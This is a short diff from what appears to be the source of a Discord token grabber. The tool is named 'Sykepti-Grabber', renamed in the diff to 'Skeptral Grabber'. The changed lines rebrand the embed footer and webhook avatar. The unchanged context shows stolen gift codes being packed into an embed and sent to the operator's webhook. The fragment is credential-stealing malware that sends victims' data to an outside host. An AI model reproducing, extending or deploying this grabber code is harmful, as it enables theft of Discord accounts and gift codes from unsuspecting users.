@@ -367,6 +367,6 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/Sykeptical")
+            embed.set_footer(text="discord.gg/Skeptral / Made by Sykeptical#6969")
 
-            self.webhook.send(embed=embed, username="Sykepti-Grabber", avatar_url="https://cdn.discordapp.com/attachments/921112750120390736/1062739533612986410/large.jpg")
+            self.webhook.send(embed=embed, username="Skeptral Grabber", avatar_url="https://imgur.com/a/T2KEOvA")
